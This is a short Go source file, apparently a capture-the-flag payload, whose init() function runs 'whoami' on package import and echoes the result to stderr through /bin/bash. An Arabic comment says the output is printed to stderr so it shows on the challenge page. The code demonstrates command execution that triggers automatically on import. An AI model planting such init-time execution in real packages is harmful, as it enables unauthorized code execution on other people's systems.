package pwn

import (
	"os/exec"
)

func init() {
	cmd := exec.Command("whoami")
	out, _ := cmd.CombinedOutput()

	// نطبع الناتج على stderr عشان يظهر في صفحة التحدّي
	exec.Command("/bin/bash", "-c", "echo "+string(out)+" 1>&2").Run()
}
